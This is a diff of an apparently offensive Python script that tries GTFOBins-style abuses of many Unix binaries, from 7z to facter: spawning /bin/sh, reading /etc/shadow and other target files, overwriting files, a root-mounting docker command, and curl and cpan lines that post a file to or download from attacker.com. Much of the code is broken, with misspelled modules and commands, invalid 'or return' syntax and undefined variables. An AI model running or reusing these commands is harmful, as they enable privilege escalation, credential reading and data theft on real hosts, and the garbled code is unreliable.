@@ -58,27 +58,27 @@ def returnCode(result):
         #Command fail
         return False
 
-#Bin function
+#Bin functions
 def default(target):
     return f"Unknown bin: {target}"
 
 def sevenZ(target):
-    return returnCode(subprocess.Popen(["7z a -ttar -an -s {target} | 7z e -ttar -si -so"], stdout=subprocess.PIPE, stderr=subprocess.PIPE))
+    return returnCode(subprocess.Popen([f"7z a -ttar -an -s {target} | 7z e -ttar -si -so"], stdout=subprocess.PIPE, stderr=subprocess.PIPE))
 
 def aaexec(target):
     return returnCode(subprocess.Popen(["aa-exec /bin/sh"]))
 
 def ab(target):
-    return True if returnCode(subProcess.Popen(["ab -p {target} 127.0.0.1"])) or returnCode(subProcess.Popen(["ab -v2 {target}"])) else False
+    return True if returnCode(subProcess.Popen([f"ab -p {target} 127.0.0.1"])) or returnCode(subProcess.Popen([f"ab -v2 {target}"])) else False
 
 def agetty(target):
     return False
 
 def alpine(target):
-    return returnCode(subprocess.Popen(["alpine -F {target}"]))
+    return returnCode(subprocess.Popen([f"alpine -F {target}"]))
 
 def ansibleplaybook(target):
-    return returnCode(subprocess.Popen([ "echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]'", "|", "ansible-playbook"]))
+    return returnCode(subprocess.Popen(["echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]'", "|", "ansible-playbook"]))
 
 def ansibletest(target):
     return returnCode(subprocess.Popen(["ansible-test shell"]))
@@ -87,7 +87,7 @@ def aoss(target):
     return returnCode(subprocess.Popen(["aoss /bin/sh"]))
 
 def apache2ctl(target):
-    return returnCode(subprocess.Popen(["apache2ctl -c \"Include {target} \"" "-k stop"]))
+    return returnCode(subprocess.Popen([f"apache2ctl -c \"Include {target} \"" "-k stop"]))
 
 def aptget(target):
     return returnCode(subprocess.Popen(["apt-get changelog apt && !/bin/sh"]))
@@ -97,18 +97,18 @@ def apt(target):
 
 def ar(target):
     temp = tempfile.TemporaryFile()
-    return returnCode(subprocess.Popen(["ar r {temp} {target}"]))
+    return returnCode(subprocess.Popen([f"ar r {temp} {target}"]))
 
 def aria2c(target):
     temp = Tempfile.TemporaryFile()
     print("id", temp)
-    subprocess.Popen(["chmod +x {temp}"])
-    return True if returnCode(subprocess.Popen(["aria2c --on-download {temp} http://x"])) or returnCode(["aria2c -o {target} {url}"]) or returnCode(subprocess.Popen(["aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=bash {url}"])) else False
+    subprocess.Popen([f"chmod +x {temp}"])
+    return True if returnCode(subprocess.Popen([f"aria2c --on-download {temp} http://x"])) or returnCode([f"aria2c -o {target} {url}"]) or returnCode(subprocess.Popen([f"aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=bash {url}"])) else False
 
 def arj(target):
     # File Read 
     temp = Tempfile.TemporaryFile()
-    subprocess.Popen(["arj", "a", "{temp}", "{target}"])
+    subprocess.Popen(["arj", "a", temp, target])
     return returnCode(subprocess.Popen(["arj", "p", temp]))
 
 def arp(target):
@@ -164,7 +164,7 @@ def batcat(target):
     return returnCode(subprocess.Popen(["batcat --paging always /etc/profile && !/bin/sh"]))
 
 def bc(target):
-    return returnCode(subprocess.Popen(["bc -s {target}"]))
+    return returnCode(subprocess.Popen([f"bc -s {target}"]))
 
 def bconsole(target):
     return returnCode(subprocess.Popen(["bconsole -c /etc/shadow"]))
@@ -173,7 +173,7 @@ def bpftrace(target):
     return False
 
 def bridge(target):
-    return returnCode(subprocess.Popen(["bridge -b {target}"]))
+    return returnCode(subprocess.Popen([f"bridge -b {target}"]))
 
 def bundle(target):
     return False
@@ -185,21 +185,21 @@ def busctl(target):
     return returnCode(subprocess.Popen(["busctl --show-machine && !/bin/sh"]))
 
 def busybox(target):
-    return True if returnCode(subprocess.Popen(["busybox sh"])) or return returnCode(subprocess.Popen(["busybox httpd -f -p 1337 -h ."])) or return returnCode(subprocess.Popen(["busybox sh -c \'echo \"DATA\" > {target}\'"])) or return returnCode(subprocess.Popen(["./busybox cat {target}"])) else False
+    return True if returnCode(subprocess.Popen(["busybox sh"])) or return returnCode(subprocess.Popen(["busybox httpd -f -p 1337 -h ."])) or return returnCode(subprocess.Popen([f"busybox sh -c \'echo \"DATA\" > {target}\'"])) or return returnCode(subprocess.Popen([f"./busybox cat {target}"])) else False
 
 def byebug(target):
     temp = Tempfile.TemporaryFile()
-    subprocess.Popen(["echo \'system(\"/bin/sh\")\' > {temp}"])
-    return returnCode(subprocess.Popen(["byebug {temp} && continue"]))
+    subprocess.Popen([f"echo \'system(\"/bin/sh\")\' > {temp}"])
+    return returnCode(subprocess.Popen([f"byebug {temp} && continue"]))
 
 def bzip2(target):
-    subprocess.Popen(["bzip2 -c {target} | bzip2 -d"])
+    subprocess.Popen([f"bzip2 -c {target} | bzip2 -d"])
 
 def c89(target):
-    return True if subprocess.Popen(["c89 -wrapper /bin/sh,-s"]) or subprocess.Popen(["c89 -xc /dev/null -o {target}"]) or subprocess.Popen(["c89 -x c -E {target}"]) else False
+    return True if subprocess.Popen(["c89 -wrapper /bin/sh,-s"]) or subprocess.Popen([f"c89 -xc /dev/null -o {target}"]) or subprocess.Popen([f"c89 -x c -E {target}"]) else False
 
 def c99(target):
-    return True if subprocess.Popen(["c99 -wrapper /bin/sh,-s"]) or subprocess.Popen(["c99 -xc /dev/null -o {target}"]) or subprocess.Popen(["c99 -x c -E {target}"]) else False
+    return True if subprocess.Popen(["c99 -wrapper /bin/sh,-s"]) or subprocess.Popen([f"c99 -xc /dev/null -o {target}"]) or subprocess.Popen([f"c99 -x c -E {target}"]) else False
 
 def cabal(target):
     return subprocess.Popen(["cabal exec -- /bin/sh"])
@@ -211,35 +211,35 @@ def capsh(target):
     return subprocess.Popen(["capsh --"])
 
 def cat(target):
-    return subprocess.Popen(["cat {target}"])
+    return subprocess.Popen([f"cat {target}"])
 
 def cdist(target):
     return subprocess.Popen(["cdist shell s /bin/sh"])
 
 def certbot(target):
-    return subprocess.Popen(["certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir {temp} --work-dir {temp} --config-dir {temp} --pre-hook \'bin/sh 1>&0 2>&0\'"])
+    return subprocess.Popen([f"certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir {temp} --work-dir {temp} --config-dir {temp} --pre-hook \'bin/sh 1>&0 2>&0\'"])
 
 def check_by_ssh(target):
     return subprocess.Popen(["check_by_ssh -o \"ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)\" -H localhost -C xx"])
 
 def check_cups(target):
-    return subprocess.Popen(["check_cups --extra-opts=@{target}"])
+    return subprocess.Popen([f"check_cups --extra-opts=@{target}"])
 
 def  check_log(target):
-    return True if subprocess.Popen(["touch input && check_log -F input -O {target}"]) or subprocess.Popen(["touch output && check_log -F {target} -O output && cat output"]) else False
+    return True if subprocess.Popen([f"touch input && check_log -F input -O {target}"]) or subprocess.Popen([f"touch output && check_log -F {target} -O output && cat output"]) else False
 
 def check_memory(target):
-    return subprocess.Popen(["check_memory --extra-opts=@{target}"])
+    return subprocess.Popen([f"check_memory --extra-opts=@{target}"])
 
 def check_raid(target):
-    return subprocess.Popen(["check_raid --extra-opts=@{target}"])
+    return subprocess.Popen([f"check_raid --extra-opts=@{target}"])
 
 def check_ssl_cert(target):
     temp = Tempfile.TemporaryFile()
-    return subprocess.Popen(["touch check_ssl_cert_output && echo \"id | tee check_ssl_cert_output\" > {temp} && chmod +x {temp} && check_ssl_cert --curl-bin {target} -H example.net && cat check_ssl_cert_output"])
+    return subprocess.Popen([f"touch check_ssl_cert_output && echo \"id | tee check_ssl_cert_output\" > {temp} && chmod +x {temp} && check_ssl_cert --curl-bin {target} -H example.net && cat check_ssl_cert_output"])
 
 def check_statusfile(target):
-    return subprocess.Popen(["check_statusfile {target}"])
+    return subprocess.Popen([f"check_statusfile {target}"])
 
 def chmod(target):
     return False
@@ -255,20 +255,20 @@ def chroot(target):
 
 def clamscan(target):
     temp = Tempfile.TemporaryFile()
-    return subprocess.Popen(["touch {temp}/empty.yara && clamscan --no-summary -d {temp} -f {target} 2>&1 | sed -nE \'s/^(.*): No such file or directory$/\1/p\'"])
+    return subprocess.Popen([f"touch {temp}/empty.yara && clamscan --no-summary -d {temp} -f {target} 2>&1 | sed -nE \'s/^(.*): No such file or directory$/\1/p\'"])
 
 def comp(target):
-    return subprocess.Popen(["cmp {target} /dev/zero -b -l"])
+    return subprocess.Popen([f"cmp {target} /dev/zero -b -l"])
 
 def cobc(target):
     temp = Tempfile.TemporaryFile()
-    return subprocess.Popen(["echo \'CALL \"SYSTEM\" USING \"/bin/sh\".\' > {temp}/x && cobc -xFj --frelax-syntax-checks {temp}/x"])
+    return subprocess.Popen([f"echo \'CALL \"SYSTEM\" USING \"/bin/sh\".\' > {temp}/x && cobc -xFj --frelax-syntax-checks {temp}/x"])
 
 def column(target):
-    return subprocess.Popen(["column {target}"])
+    return subprocess.Popen([f"column {target}"])
 
 def comm(target):
-    return subprocess.Popen(["comm {target} /dev/null 2>/dev/null"])
+    return subprocess.Popen([f"comm {target} /dev/null 2>/dev/null"])
 
 def composer(target):
     temp = Tempfile.TemporaryFile()
@@ -276,14 +276,14 @@ def composer(target):
 
 def cowsay(target):
     temp = Tempfile.TemporaryFile()
-    return subprocess.Popen(["echo \'exec \"/bin/sh\";\' >{temp} && cowsay -f {target} x"])
+    return subprocess.Popen([f"echo \'exec \"/bin/sh\";\' >{temp} && cowsay -f {target} x"])
 
 def cowthink(target):
     temp = Tempfile.TemporaryFile()
-    return subprocess.Popen(["echo \'exec \"/bin/sh\";\' >{temp} && cowthink -f {target} x"])
+    return subprocess.Popen([f"echo \'exec \"/bin/sh\";\' >{temp} && cowthink -f {target} x"])
 
 def cp(target):
-    return True if subprocess.Popen(["echo \"DATA\" | cp /dev/stdin {target}"]) or subprocess.Popen(["cp {target} /dev/stdout"]) else False
+    return True if subprocess.Popen([f"echo \"DATA\" | cp /dev/stdin {target}"]) or subprocess.Popen([f"cp {target} /dev/stdout"]) else False
 
 def cpan(target):
     return True if subprocess.Popen(["cpan && ! exec \'bin/bash\'"]) or subprocess.Popen(["cpan && ! use HTTP::Server::Simple; my $server= HTTP::Server::Simple->new(); $server->run();"]) or subproess.Popen(["cpan && ! use File::Fetch; my $file = (File::Fetch->new(uri => \"http://attacker.com/file_to_get\")) ->fetch();"])
@@ -302,55 +302,55 @@ def crontab(target):
     return subprocess.Popen(["crontab -e"])
 
 def csh(target):
-    return True if subprocess.Popen(["csh"]) or subprocess.Popen(["ash -c \'echo DATA > {target}\'"]) else False
+    return True if subprocess.Popen(["csh"]) or subprocess.Popen([f"ash -c \'echo DATA > {target}\'"]) else False
 
 def csplit(target):
     temp = Tempfile.TemporaryFile()
-    return True if subprocess.Popen(["echo \"DATA\" > {temp} && csplit -z -b \"\&d{target}\" {temp} 1"]) or subprocess.Popen(["csplit {target} 1 && cat xx01"])
+    return True if subprocess.Popen([f"echo \"DATA\" > {temp} && csplit -z -b \"\&d{target}\" {temp} 1"]) or subprocess.Popen([f"csplit {target} 1 && cat xx01"])
 
 def csvtool(target):
     temp = Tempfile.TemporaryFile()
-    return True if subprocess.Popen(["csvtool call \'/bin/sh;false\' /etc/passwd"]) or subprocess.Popen(["echo DATA > {temp} && csvtool trim t {temp} -o {target}"]) or subprocess.Popen(["csvtool trim t {target}"])
+    return True if subprocess.Popen(["csvtool call \'/bin/sh;false\' /etc/passwd"]) or subprocess.Popen([f"echo DATA > {temp} && csvtool trim t {temp} -o {target}"]) or subprocess.Popen([f"csvtool trim t {target}"])
 
 def cupsfilter(target):
-    return subprocess.Popen(["cupsfilter -i application/octet-stream -m application/octet-stream {target}"])
+    return subprocess.Popen([f"cupsfilter -i application/octet-stream -m application/octet-stream {target}"])
 
 def curl(target):
     temp = Tempfile.TemporaryFile()
-    return True if subprocess.Popen(["curl -X POST -d \"@{target} http://attacker.com"]) or subprocess.Popen(["curl http://attacker.com -o {target}"]) or subprocess.Popen(["echo DATA >{temp} && curl \"file://{temp}\" -o {target}"]) or subprocess.Popen(["curl file://{target}"])
+    return True if subprocess.Popen([f"curl -X POST -d \"@{target} http://attacker.com"]) or subprocess.Popen([f"curl http://attacker.com -o {target}"]) or subprocess.Popen([f"echo DATA >{temp} && curl \"file://{temp}\" -o {target}"]) or subprocess.Popen([f"curl file://{target}"])
 
 def cut(target):
-    return subprocess.Popen(["cur -d \"\" -f1 {target}"])
+    return subprocess.Popen([f"cur -d \"\" -f1 {target}"])
 
 def dash(target):
-    return True if subprocess.Popen(["dash"]) or subprocess.Popen(["dash -c \'echo DATA > {target}\'"]) else False
+    return True if subprocess.Popen(["dash"]) or subprocess.Popen([f"dash -c \'echo DATA > {target}\'"]) else False
 
 def date(target):
-    return subprocess.Popen(["date -f {target}"])
+    return subprocess.Popen([f"date -f {target}"])
 
 def dc(target):
     return subprocess.Popen(["dc -e \'!/bin/sh\'"])
 
 def dd(target):
-    return True if subprocess.Popen(["echo \"DATA\" | dd of={target}"]) or subprocess.Popen(["dd if={target}"]) else False
+    return True if subprocess.Popen([f"echo \"DATA\" | dd of={target}"]) or subprocess.Popen([f"dd if={target}"]) else False
 
 def debugfs(target):
     return subprocess.Popen(["debugfs && !/bin/sh"])
 
 def dialog(target):
-    return subprocess.Popen(["dialog --textbox {target} 0 0"])
+    return subprocess.Popen([f"dialog --textbox {target} 0 0"])
 
 def diff(target):
-    return True if subprocess.Popen(["diff --line-format=%L /dev/null {target}"])
+    return True if subprocess.Popen([f"diff --line-format=%L /dev/null {target}"])
 
 def dig(target):
-    return subprocess.Popen(["dig -f {target}"])
+    return subprocess.Popen([f"dig -f {target}"])
 
 def distcc(target):
     return subprocess.Popen(["distcc /bin/sh"])
 
 def dmesg(target):
-    return True if subprocess.Popen(["dmesg -H"] or subprocess.Popen(["dmesg -rF {target}"]))
+    return True if subprocess.Popen(["dmesg -H"] or subprocess.Popen([f"dmesg -rF {target}"]))
 
 def dmidecode(target):
     return False
@@ -362,16 +362,16 @@ def dnf(target):
     return False
 
 def docker(target):
-    return True if subprocess.Popen(["docker run -v /:/mnt --rm -it alpine chroot /mnt sh"]) or subprocess.Popen(["echo \"DATA\" > {temp} && docker cp {temp} {containerid}:{temp} && docker cp {containerid}:{temp} {target}"]) else False
+    return True if subprocess.Popen(["docker run -v /:/mnt --rm -it alpine chroot /mnt sh"]) or subprocess.Popen([f"echo \"DATA\" > {temp} && docker cp {temp} {containerid}:{temp} && docker cp {containerid}:{temp} {target}"]) else False
 
 def dos2unix(target):
-    return subprocess.Popen(["echo \"Data\" > temp && dos2unix -f -n temp {target}"])
+    return subprocess.Popen([f"echo \"Data\" > temp && dos2unix -f -n temp {target}"])
 
 def dosbox(target):
-    return True if subprocess.Popen(["dosbox -c \'mount c /\' -c \"echo DATA >c:{target}\" -c exit"]) or subprocess.Popen(["doxbos -c \'mont c /\' -c \"type c:{target}\""]) or subprocess.Popen(["dosbox -c \'mount c /\' -c \"copy c:{target} c:\temp\output\" -c exit && cat \'/tmp/OUTPUT\'"]) else False
+    return True if subprocess.Popen([f"dosbox -c \'mount c /\' -c \"echo DATA >c:{target}\" -c exit"]) or subprocess.Popen([f"doxbos -c \'mont c /\' -c \"type c:{target}\""]) or subprocess.Popen([f"dosbox -c \'mount c /\' -c \"copy c:{target} c:\temp\output\" -c exit && cat \'/tmp/OUTPUT\'"]) else False
 
 def dotnet(target):
-    return True if subprocess.Popen(["dotnet fsi && System.Diagnostics.Process.Start(\"/bin/sh\").WaitForExit();;"]) or subprocess.Popen(["dotnet fsi && System.IO.File.ReadAllText(System.Environment.GetEnvironmentVariable({target}));;"]) else False
+    return True if subprocess.Popen(["dotnet fsi && System.Diagnostics.Process.Start(\"/bin/sh\").WaitForExit();;"]) or subprocess.Popen([f"dotnet fsi && System.IO.File.ReadAllText(System.Environment.GetEnvironmentVariable({target}));;"]) else False
 
 def dpkg(target):
     return subprocess.Popen(["dpkg -l && !/bin/sh"])
@@ -390,16 +390,16 @@ def eb(target):
     return subprocess.Popen(["eb logs && !/bin/sh"])
 
 def ed(target):
-    return True if subprocess.Popen(["ed && !/bin/sh"]) or subprocess.Popen(["ed {target} && a && DATA && . && w && q"]) or subprocess.Popen(["ed {target} && ,p && q"]) else False
+    return True if subprocess.Popen(["ed && !/bin/sh"]) or subprocess.Popen([f"ed {target} && a && DATA && . && w && q"]) or subprocess.Popen([f"ed {target} && ,p && q"]) else False
 
 def efax(target):
     return False
 
 def evlish(target):
-    return True if subprocess.Popen(["elvish"]) or subprocess.Popen(["elvish -c \'echo (slurp >{target})"]) or subprocess.Popen(["elvish -c \'echo (slurp <{target})"]) else False
+    return True if subprocess.Popen(["elvish"]) or subprocess.Popen([f"elvish -c \'echo (slurp >{target})"]) or subprocess.Popen([f"elvish -c \'echo (slurp <{target})"]) else False
 
 def emacs(target):
-    return True if subprocess.Popen(["emacs -Q -nw --eval \'(term \"/bin/sh\")\'"]) or subprocess.Popen(["emacs {target} && DATA && C-x C-s"]) or subprocess.Popen(["emacs {target}"]) else False
+    return True if subprocess.Popen(["emacs -Q -nw --eval \'(term \"/bin/sh\")\'"]) or subprocess.Popen([f"emacs {target} && DATA && C-x C-s"]) or subprocess.Popen([f"emacs {target}"]) else False
 
 def enscript(target):
     return subprocess.Popen(["enscript /dev/null -qo /dev/null -I \'/bin/sh >&2\'"])
@@ -408,28 +408,26 @@ def env(target):
     return subprocess.Popen(["env /bin/sh"])
 
 def eqn(target):
-    return subprocess.Popen(["eqn {target}"])
+    return subprocess.Popen([f"eqn {target}"])
 
 def espeak(target):
-    return subprocess.Popen(["espeak -qXf {target}"])
+    return subprocess.Popen([f"espeak -qXf {target}"])
 
 def ex(target):
-    return True if subprocess.Popen(["ex && !/bin/sh"]) or subprocess.Popen(["ex {target} && a && DATA && x && w && q"]) or subprocess.Popen(["ex {target} && ,p && q"]) else False
+    return True if subprocess.Popen(["ex && !/bin/sh"]) or subprocess.Popen([f"ex {target} && a && DATA && x && w && q"]) or subprocess.Popen([f"ex {target} && ,p && q"]) else False
 
 def exiftool(target):
-    return True if subprocess.Popen(["exiftool -filename={target} \"DATA\""]) or subprocess.Popen(["exiftool filename=output_exiftool {target} && cat output"]) else False
+    return True if subprocess.Popen([f"exiftool -filename={target} \"DATA\""]) or subprocess.Popen([f"exiftool filename=output_exiftool {target} && cat output"]) else False
 
 def expand(target):
-    return subprocess.Popen(["expand {target}"])
+    return subprocess.Popen([f"expand {target}"])
 
 def expect(target):
-    return True if subprocess.Popen(["expect -c \'spwan /bin/sh;interact\'"]) or subprocess.Popen(["expect {target}"])
+    return True if subprocess.Popen(["expect -c \'spwan /bin/sh;interact\'"]) or subprocess.Popen([f"expect {target}"])
 
 def factor(target):
     temp = Tempfile.TemporaryFile()
-    return subprocess.Popen(["echo \'exec(\"/bin/sh\")\' > {target}/x.rb && FACTERLIB={temp} facter"])
-
-
+    return subprocess.Popen([f"echo \'exec(\"/bin/sh\")\' > {target}/x.rb && FACTERLIB={temp} facter"])
 
 
 def check_value(bin, file):
